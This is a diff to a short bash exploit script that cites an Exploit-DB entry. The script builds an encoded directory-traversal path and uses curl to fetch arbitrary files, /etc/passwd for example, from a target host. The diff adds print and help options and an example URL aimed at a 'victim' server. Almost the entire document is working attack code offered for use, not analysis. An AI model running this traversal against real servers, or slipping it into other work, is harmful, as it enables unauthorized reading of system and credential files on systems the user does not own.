@@ -6,14 +6,13 @@
 # https://www.exploit-db.com/exploits/38833/       ###
 #####################################################
 
-if [[ $1 == "" ]];then
-  echo "USAGE: $0 host path <1.2.3.4> </etc/passwd>"
-fi
+# EXAMPLE: #http://victim//%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/%2fetc%2fpasswd
 
 host=$1
 exploit="/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
 
-#//%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/%2fetc%2ffstab
+
+
 
 rawurlencode() {
   local string="${1}"
@@ -33,5 +32,23 @@ rawurlencode() {
 }
 
 
-lpath=$(rawurlencode "$2");echo $lpath
+
+case "$1" in
+ --print|-P) host=$2
+exploit="/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
+lpath=$(rawurlencode "$3")
+echo "URL for path $lpath: "
+echo $lpath
+
+;;
+ --help|-h)     echo "USAGE: $0 <host> path <1.2.3.4> </etc/passwd>"
+		echo '--print|-P : Print URL Only, do not connect'
+		echo  '--help|-h> : Display this help'
+;;
+ *) host=$1
+exploit="/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
+lpath=$(rawurlencode "$2");echo "URL: $lpath"
 curl $1/$exploit/$lpath
+
+;;
+esac
